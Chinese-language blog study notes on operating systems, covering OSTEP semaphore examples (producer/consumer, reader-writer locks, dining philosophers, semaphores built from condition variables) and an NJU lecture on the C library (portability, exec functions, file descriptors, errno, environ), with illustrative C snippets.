<p>可以看到出现并发 bug 的根本原因在于两个进程同时进入了临界区域，发生了数据竞争。联想条件变量的写法，线程在 wait() 中被唤醒后有一个尝试重新获得自旋锁的过程，而在这里的信号量实现中我们没有用锁把临界区域保护起来。因此我们只要加锁即可。</p>
<blockquote>
<p><strong>真的随便加一个锁就可以了吗？</strong></p>
<p>考虑如下加锁后的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">producer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LOOP; i++) &#123;</span><br><span class="line">     lock(&amp;lk);</span><br><span class="line">     sem_wait(&amp;empty);</span><br><span class="line">     put(i);</span><br><span class="line">     sem_post(&amp;full);</span><br><span class="line">     unlock(&amp;lk);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consumer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">     lock(&amp;lk);</span><br><span class="line">     sem_wait(&amp;full);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, get());</span><br><span class="line">     sem_post(&amp;empty);</span><br><span class="line">     unlock(&amp;lk);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设一个消费者线程先运行，它获得了锁之后，调用 sem_wait()，发现 <code>full == -1</code>，于是带着锁陷入了睡眠。这样别的线程再要尝试获得锁时就会陷入死锁：消费者线程拥有锁，在等待 full 信号；生产者线程可以 signal，但得先获得锁，这是一个标准的死锁。</p>
<p>联想条件变量的实现，cond_wait() 和 sem_wait() 的不同在于，cond_wait() 接收一个锁的参数，会原子地完成线程睡眠和锁释放，而 sme_wait() 没有帮我们释放锁的功能。</p>
<p>事实上，条件变量要把锁加在前面是因为我们要保证对全局的状态变量的访问 ( <code>while (!cond)</code> ) 是原子的。但信号量本身已经保证原子性了。我们只要把锁加在里面就是正确的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">producer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LOOP; i++) &#123;</span><br><span class="line">     sem_wait(&amp;empty);</span><br><span class="line">     lock(&amp;lk);</span><br><span class="line">     put(i);</span><br><span class="line">     unlock(&amp;lk);</span><br><span class="line">     sem_post(&amp;full);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consumer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">     sem_wait(&amp;full);</span><br><span class="line">     lock(&amp;lk);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, get());</span><br><span class="line">     unlock(&amp;lk);</span><br><span class="line">     sem_post(&amp;empty);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/producer_consumer_works.c">produer_consumer_works.c</a> 提供了完整的实现。</p>
</blockquote>
<h2 id="31-5-Reader-Writer-Locks"><a href="#31-5-Reader-Writer-Locks" class="headerlink" title="31.5 Reader-Writer Locks"></a>31.5 Reader-Writer Locks</h2><p>动机：对于并发数据结构，我们会用锁保护与之相关的函数。我们用锁保护读函数是为了避免写的过程中读取函数执行导致奇怪的问题，但这也导致了如果当前只有很多个线程读取而没有写操作，我们的读取无法并行。Reader-Writer Locks 致力于解决这个问题 (事实上以下方法中的信号量都在模拟锁的行为，可以只使用自旋锁完成)。</p>
<p>解决这个问题的基本思路是：写操作每次要获得一个写锁，完成任务后要释放写锁。读操作的行为有所不同：我们维护一个变量 reader 记录当前正在读的线程的个数，当 <code>reader == 1</code> 时，读线程要获得写锁，这样就屏蔽了写操作，后续更多的读操作可以加入进来。当 <code>reader == 0</code> 时，读线程要释放写锁。(当然，读线程修改 reader 变量的过程还需要一个锁保护)。大致的伪代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">rwlock_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">sem_t</span> reader_lock;</span><br><span class="line">    <span class="keyword">sem_t</span> writelock;</span><br><span class="line">    <span class="keyword">int</span> readers;</span><br><span class="line">&#125;<span class="keyword">rwlock_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rwlock_init</span><span class="params">(<span class="keyword">rwlock_t</span> *rw)</span> </span>&#123;</span><br><span class="line">    rw-&gt;readers = <span class="number">0</span>;</span><br><span class="line">    sem_init(&amp;rw-&gt;reader_lock, <span class="number">0</span>, <span class="number">1</span>); <span class="comment">// 信号量作为睡眠锁</span></span><br><span class="line">    sem_init(&amp;rw-&gt;writelock, <span class="number">0</span>, <span class="number">1</span>);   <span class="comment">// 信号量作为睡眠锁</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rwlock_acquire_readlock</span><span class="params">(<span class="keyword">rwlock_t</span> *rw)</span> </span>&#123;</span><br><span class="line">    sem_wait(&amp;rw-&gt;reader_lock);</span><br><span class="line">    reader++;</span><br><span class="line">    <span class="keyword">if</span> (reader == <span class="number">1</span>)</span><br><span class="line">        sem_wait(&amp;rw-&gt;writelock);</span><br><span class="line">    sem_post(&amp;rw-&gt;reader_lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rwlock_release_readlock</span><span class="params">(<span class="keyword">rwlock_t</span> *rw)</span> </span>&#123;</span><br><span class="line">    sem_wait(&amp;rw-&gt;reader_lock);</span><br><span class="line">    reader--;</span><br><span class="line">    <span class="keyword">if</span> (reader == <span class="number">0</span>)</span><br><span class="line">        sem_post(&amp;rw-&gt;writelock);</span><br><span class="line">    sem_post(&amp;rw-&gt;reader_lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rwlock_acquire_writelock</span><span class="params">(<span class="keyword">rwlock_t</span> *rw)</span> </span>&#123;sem_wait(&amp;rw-&gt;writelock);&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rwlock_release_writelock</span><span class="params">(<span class="keyword">rwlock_t</span> *rw)</span> </span>&#123;sem_post(&amp;rw-&gt;writelock);&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/rwlock.c">rwlock.c</a> 提供了完整的实现。</p>
<p>该算法存在一定的公平性隐患：如果读线程比较多，源源不断地加入，写线程可能会一直调度不上。(一个可能的维护公平性的方法是为 reader 设置一个上限，如果 <code>reader == MAX_READER</code>，则把读线程挂起。)</p>
<blockquote>
<p><strong>Hill’s Law</strong></p>
<p>Hill’s Law 大致的意思是在很多情况下，那些看上去简单笨拙的实现反而是好的。在这里，reader-writer lock  虽然看起来很 fancy，但实际使用时未必好过简单的自旋锁，这是因为维护精巧的结构总需要更多的开销。因此，抛开 workload 谈优化就是耍流氓。</p>
</blockquote>
<h2 id="31-6-The-Dining-Philosophers"><a href="#31-6-The-Dining-Philosophers" class="headerlink" title="31.6 The Dining Philosophers"></a>31.6 The Dining Philosophers</h2><p>一个哲学家的行为可以用如下函数描述：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">philosopher</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        think();</span><br><span class="line">        getforks();</span><br><span class="line">        eat();</span><br><span class="line">        putforks();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们简单地为每把叉子建立一个信号量，然后这样构建 getforks() 和 putforks()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">left</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;<span class="keyword">return</span> p;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">right</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;<span class="keyword">return</span> (p + <span class="number">1</span>) % PHI_NUM;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getforks</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">    sem_wait(forks[left(p)]);</span><br><span class="line">    sem_wait(forks[right(p)]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putforks</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">    sem_post(forks[left(p)]);</span><br><span class="line">    sem_post(forks[right(p)]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>容易发现这个程序有死锁风险：如果每个哲学家都拿起了自己左手的叉子，那么所有人都会等待自己右手边的叉子，而又没有任何人会放下自己左手上的叉子——死锁。<a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/dining_philosophers_deadlock_print.c">dining_philosophers_deadlock_print.c</a> 打印出了死锁的局面。</p>
<p>如果锁的需求链出现了环，就会发生死锁，Dijkstra 用一个简单的方法解决了这个问题：只要安排某一个哲学家先拿右手叉子再拿左手叉子，就可以破这个局：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getforks</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p == PHI_NUM) &#123;</span><br><span class="line">        sem_wait(forks[right(p)]);</span><br><span class="line">        sem_wait(forks[left(p)]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        sem_wait(forks[left(p)]);</span><br><span class="line">        sem_wait(forks[right(p)]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/dining_philosophers_no_deadlock.c">dining_philosophers_no_deadlock.c</a> 提供了完整的实现。</p>
<h2 id="31-7-How-To-Implement-Semaphores"><a href="#31-7-How-To-Implement-Semaphores" class="headerlink" title="31.7 How To Implement Semaphores"></a>31.7 How To Implement Semaphores</h2><p>我们在 31.1 已经建立了信号量的语义，因此用条件变量实现信号量 (不妨称之为 zemaphore) 非常简单：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zem_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="keyword">pthread_cond_t</span> cond;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> lock;</span><br><span class="line">&#125;<span class="keyword">zem_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">zem_init</span><span class="params">(<span class="keyword">zem_t</span> *z, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    z-&gt;val = val;</span><br><span class="line">    Cond_init(&amp;z-&gt;cond); <span class="comment">// 带返回值检查的 pthread_cond_init()</span></span><br><span class="line">    Mutex_init(&amp;z-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">zem_wait</span><span class="params">(<span class="keyword">zem_t</span> *z)</span> </span>&#123;</span><br><span class="line">    Mutex_lock(&amp;z-&gt;lock);</span><br><span class="line">    <span class="keyword">while</span> (z-&gt;val &lt;= <span class="number">0</span>)</span><br><span class="line">        Cond_wait(&amp;z-&gt;cond, &amp;z-&gt;lock);</span><br><span class="line">    z-&gt;val--;</span><br><span class="line">    Mutex_unlock(&amp;z-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">zem_post</span><span class="params">(<span class="keyword">zem_t</span> *z)</span> </span>&#123;</span><br><span class="line">    Mutex_lock(&amp;z-&gt;lock);</span><br><span class="line">    z-&gt;val++;</span><br><span class="line">    Cond_signal(&amp;z-&gt;cond);</span><br><span class="line">    Mutex_unlock(&amp;z-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/zemaphore.h">zemaphore.h</a> 提供了完整的实现，<a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/zemaphore.c">zemaphore.c</a> 提供了一个使用 zemaphores 的例子。 </p>
<h2 id="31-8-Summary"><a href="#31-8-Summary" class="headerlink" title="31.8 Summary"></a>31.8 Summary</h2><p>略。</p>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 14: C Library</title>
    <url>/2022/04/04/NJU-OS%20Lecture%2014%20-%20C%20Library/</url>
    <content><![CDATA[<p><code>sh-xv6.c</code> 可以在 freestanding 的环境下直接运行：我们最终使用 <code>ld sh-xv6.o -o sh</code> 生成二进制文件，这意味着二进制文件中有且仅有 <code>sh-xv6.o</code> 中的函数。</p>
<p>我们平时在编写程序的时候显然不希望在 freestanding 的环境下编程——联想我们在 <code>sh-xv6.c</code> 中，读取字符串都要用內联汇编的系统调用，这太糟糕了。我们自然而然地希望有一些封装好的库函数可以使用。</p>
<span id="more"></span>

<h2 id="Libc-Overview"><a href="#Libc-Overview" class="headerlink" title="Libc: Overview"></a>Libc: Overview</h2><h3 id="Portability"><a href="#Portability" class="headerlink" title="Portability"></a>Portability</h3><p>在 freestanding 环境下我们也有一些库可以使用。如果我们想写出可移植性强的代码，我们应该使用 libc 中提供的数据类型：</p>
<ul>
<li><p>比如我们要保存一个指针的值，瞎猜一个 <code>int</code> <code>long</code> 不是好的选择，我们应该用 <code>intptr_t</code> (该类型在 <code>stdint.h</code> 中定义)；比如我们想保存一个 4 字节的数据，应该使用 <code>int32_t</code>。(<code>long</code> 的长度是随架构变化的) 等等。</p>
</li>
<li><p>C 语言支持边长参数。例如 printf() 的声明是：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br></pre></td></tr></table></figure>

<p>  在 x86 架构中，参数是一个接着一个放在栈上的，因此在一些 i386 的代码中我们可能会看见下面的这种写法：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> **p = (<span class="keyword">void</span> *)&amp;fmt;</span><br><span class="line"><span class="comment">// use p[i] to get the address of the ith argument</span></span><br></pre></td></tr></table></figure>

<p>  但 riscv64, x86-64 等架构是用寄存器传递参数的。为了写出可移植性更好的代码，我们应该使用 <code>va_list</code> 类型，然后用 <code>va_start()</code> <code>va_arg()</code> <code>va_end()</code> 等 API 去访问各个参数 (该类型在 <code>stdarg.h</code> 中定义)。</p>
<blockquote>
<p><strong>使用 libc 一定高效吗?</strong></p>
<p>不一定。GCC 的遗留问题使得使用 libc 编译出的汇编代码可能会“很笨”。例如 <code>sh-xv6.c</code> 中关于系统调用的这段代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">syscall</span><span class="params">(<span class="keyword">int</span> num, ...)</span> </span>&#123;</span><br><span class="line">va_list ap;</span><br><span class="line">va_start(ap, num);</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a0 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rax&quot;</span>)</span> </span>= num;</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a1 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rdi&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a2 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rsi&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a3 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rdx&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a4 <span class="title">asm</span> <span class="params">(<span class="string">&quot;r10&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line">va_end(ap);</span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;syscall&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function"> : <span class="string">&quot;+r&quot;</span>(a0) : <span class="string">&quot;r&quot;</span>(a1), <span class="string">&quot;r&quot;</span>(a2), <span class="string">&quot;r&quot;</span>(a3), <span class="string">&quot;r&quot;</span>(a4)</span></span></span><br><span class="line"><span class="params"><span class="function"> : <span class="string">&quot;memory&quot;</span>, <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r8&quot;</span>, <span class="string">&quot;r9&quot;</span>, <span class="string">&quot;r11&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">return</span> a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们分别为 1,2,3,4 个参数的系统调用写 4 个接口，像下面这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">syscall4</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">long</span> a1, <span class="keyword">long</span> a2, <span class="keyword">long</span> a3, <span class="keyword">long</span> a4)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">long</span> a0 = num;</span><br><span class="line"> <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;syscall&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">     : <span class="string">&quot;+r&quot;</span>(a0) : <span class="string">&quot;r&quot;</span>(a1), <span class="string">&quot;r&quot;</span>(a2), <span class="string">&quot;r&quot;</span>(a3), <span class="string">&quot;r&quot;</span>(a4)</span></span></span><br><span class="line"><span class="params"><span class="function">     : <span class="string">&quot;memory&quot;</span>, <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r8&quot;</span>, <span class="string">&quot;r9&quot;</span>, <span class="string">&quot;r11&quot;</span>)</span></span>;</span><br><span class="line"> <span class="keyword">return</span> a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察两者在 -O2 优化下反汇编的结果，可以看到前者在寄存器和栈上来回倒腾数据，而后者只用了很少的代码就完成了工作。</p>
</blockquote>
</li>
<li><p>printf() 的模式串中也涉及可移植性的问题。比如我们可能常常这么写程序：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int64_t</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, a);</span><br></pre></td></tr></table></figure>

<p>  但 <code>%ld</code> 是用于打印一个 <code>long</code> 长度的变量的，<code>long</code> 的长度随架构变化而变化，上述代码在 32 位的架构上就会报 warning。<code>inttypes.h</code> 其实为模式串的可移植性也设计了一套符号 (但很复杂)。</p>
</li>
</ul>
<h3 id="Convenience"><a href="#Convenience" class="headerlink" title="Convenience"></a>Convenience</h3><p>并不是所有的系统调用都像 fork() 那样简单易用，因此库函数有义务将系统调用封装成更易用的样子，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;</span><br><span class="line"><span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span>, &#125;;</span><br><span class="line"><span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argc, environ) &lt; <span class="number">0</span>) perror(<span class="string">&quot;exec&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>运行上述程序，我们会得到 <code>exec: No such file or directory</code>。这是因为 execve() 要求第一个参数必须是完整的 pathname。一些高情商的 API 是这样封装的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execlp(<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">system(<span class="string">&quot;echo hello world&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>exec() 家族的库函数有很多：</p>
<ul>
<li>l 系列的函数支持变长参数，我们不用单独开一个参数数组 argv[] 而可以直接把要传的参数放进去。与之相对地，v 系列的函数将参数保存好以后，将 argv[] 放到函数中即可，这对于多次使用同样参数很有利。</li>
<li>p 系列的参数在第一个 pathname 中没有 <code>/</code> 的情况下，会遍历 PATH 环境变量中的所有路径，将其接在文件名前面并尝试 execve()。</li>
<li>e 系列可以不使用系统环境默认的环境变量，而是传入一个 envp[] 数组指定环境变量 (非 e 系列的函数默认以 <code>extern char *environ[]</code> 的内容作为环境变量)。</li>
</ul>
<p>更多的内容可以查看手册。</p>
<h2 id="Encapsulation-Calculation"><a href="#Encapsulation-Calculation" class="headerlink" title="Encapsulation: Calculation"></a>Encapsulation: Calculation</h2><p>纯计算的工作是我们大量使用并想要封装的，比如统计字符串的长度、给一段内存赋值等等。这看上去是非常简单的事情，但如果考虑到效率，安全性等因素，事情就变得复杂了。比如如下一段 memset 的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">vodi *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *s, <span class="keyword">int</span> c, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        ((<span class="keyword">char</span> *)s)[i] = c;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果有多个线程调用该程序，它能保证安全性吗？数据会互相覆盖吗？我们可以先用 libc 标准的 memset() 来测试一下多线程下的表现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memset-race.c#include &quot;thread.h&quot;char buf[1 &lt;&lt; 30];void foo(int id) &#123;  memset(buf, &#x27;0&#x27; + id, sizeof(buf) - 1);&#125;int main() &#123;  for (int i = 0; i &lt; 4; i++)    create(foo);  join();  puts(buf);&#125;</span></span><br></pre></td></tr></table></figure>

<p>多个线程同时对一段内存赋值，这是一个标准的数据竞争。运行这段程序我们可以看到 1,2,3,4 都有被输出。根据标准，标准库只对“标准库内部数据”的线程安全性负责 (比如 printf 的 buffer 是有锁保护的)，对外部数据库函数没有义务处理数据竞争。</p>
<p>除此之外，封装的“好用”也是我们的一大目标。我们可以对比 C 语言的排序函数和 C++ 的排序函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">void</span> *base, <span class="keyword">size_t</span> nmemb, <span class="keyword">size_t</span> size,                  <span class="keyword">int</span> (*compar)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *))</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>(xs.<span class="built_in">begin</span>(), xs.<span class="built_in">end</span>(), [](<span class="keyword">auto</span> &amp;a, <span class="keyword">auto</span> *b) &#123;...&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到 C++ 的库函数明显更好用：我们可以直接用迭代器的 begin 和 end，还可以用 lambda 表达式把比较函数直接写在 sort() 里面。</p>
<h2 id="Encapsulation-File-Descriptors"><a href="#Encapsulation-File-Descriptors" class="headerlink" title="Encapsulation: File Descriptors"></a>Encapsulation: File Descriptors</h2><p>操作系统有义务封装对象 (比如终端，管道，文件 etc.) 并暴露合适的 API 给应用程序。由于 UNIX 秉持 everything is a file 的哲学，所以封装对象的核心就是文件描述符。</p>
<p>考虑如下程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;    FILE *fp = fopen(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;Hello, world\n&quot;</span>);    <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>它会向 <code>a.txt</code> 输出 Hello, world。这里的文件指针事实上指向的就是文件结构体。我们可以尝试用 GDB 调试这段代码，用 <code>p *fp</code> 打印 fp 指针指向的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;_flags = -72539004, _IO_read_ptr = 0x0, _IO_read_end = 0x0,   _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0,   _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0,   _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0,   _markers = 0x0, _chain = 0x7ffff7fa15e0 &lt;_IO_2_1_stderr_&gt;, _fileno = 3,   _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 &#x27;\000&#x27;,   _shortbuf = &quot;&quot;, _lock = 0x555555559380, _offset = -1, _codecvt = 0x0,   _wide_data = 0x555555559390, _freeres_list = 0x0, _freeres_buf = 0x0,   __pad5 = 0, _mode = 0, _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这是一个文件描述符为 3 的文件。如果我们用 <code>p *stdin/*stdout/*stderr</code> 打印，也可以看到类似的内容，标准输入/输出/错误都是文件。</p>
<p>另一个有意思的 API 是 popen()，它可以打开一个管道。这其实是一个设计的有缺陷的 API：手册中明确提到 UNIX pipe 是单向的：它有一个读口和一个写口，而文件指针 <code>FILE *</code> 只能封装一个文件描述符，所以使用 popen() 必须指定从管道读还是写向管道。(现代的编程语言对管道 API 封装的更好。)</p>
<h2 id="Encapsulation-Utilities"><a href="#Encapsulation-Utilities" class="headerlink" title="Encapsulation: Utilities"></a>Encapsulation: Utilities</h2><h3 id="err"><a href="#err" class="headerlink" title="err"></a>err</h3><blockquote>
<p>为什么 <code>cat nonexist.c</code> <code>gcc nonexist.c</code> 等命令输出的都是 “xxx: nonexist.c: No such file or directory”?</p>
</blockquote>
<p>我们也可以用库函数山寨一个类似的版本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// err-message.c#include &lt;err.h&gt;#include &lt;stdio.h&gt;int main ()&#123;	const char *filename = &quot;nonexist.c&quot;;	FILE *fp = fopen(filename, &quot;r&quot;);	if (!fp) warn(&quot;%s&quot;, filename);	return 0;&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>err.h</code> <code>errno.h</code> 提供若干这样将错误信息输出到标准错误的函数，好用的函数还有 perror()，err() 等。err() 可以在输出错误信息后直接退出程序，如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = open(filename, O_RONLY, <span class="number">0</span>);<span class="keyword">if</span> (fd == <span class="number">-1</span>)    err(EXIT_FAILURE, <span class="string">&quot;%s&quot;</span>, filename);</span><br></pre></td></tr></table></figure>

<p>这些函数的原理是根据全局变量 errno 的数值，打印上一次错误的原因。手册中对于 errno 的解释为：</p>
<blockquote>
<p>errno  is  defined  by  the ISO C standard to be a modifiable lvalue of type int, and must not be explicitly declared; errno may  be  a  macro. errno  is  thread-local;  setting  it in one thread does not affect its value in any other thread.</p>
</blockquote>
<p>值得注意的一点是 errno 是线程独享的 thread-local 变量。从这里我们可以看到协程相对于线程更轻量级体现在何处。</p>
<h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// env.c#include &lt;stdio.h&gt;int main() &#123;  extern char **environ;  for (char **env = environ; *env; env++) &#123;    printf(&quot;%s\n&quot;, *env);  &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>C 库函数为我们提供了一个指针 environ，通过它我们可以找到环境变量列表。一个自然的问题是：这个指针是什么时候指向正确的位置的？</p>
<p>我们可能认为在 CPU reset 到 boot 完成期间 environ 就被设置好了，但考虑到一个程序的环境变量是在 execve() 的时候传进去的，不同程序可以不一样，这个变量显然应该是在进程加载启动时才设置的。</p>
<p>我们可以用 GDB 观测这个行为。在静态加载下，用 <code>gdb ./env</code> 启动上述程序并用 <code>starti</code> 停在第一条汇编指令，查看 <code>p (char **)environ</code> ，发现此时 environ 还是空指针。我们可以在 environ 上加监视点 <code>wa (char **)environ</code> ，即可看到在 <code>__libc_start_main()</code> 函数中修改了 environ。</p>
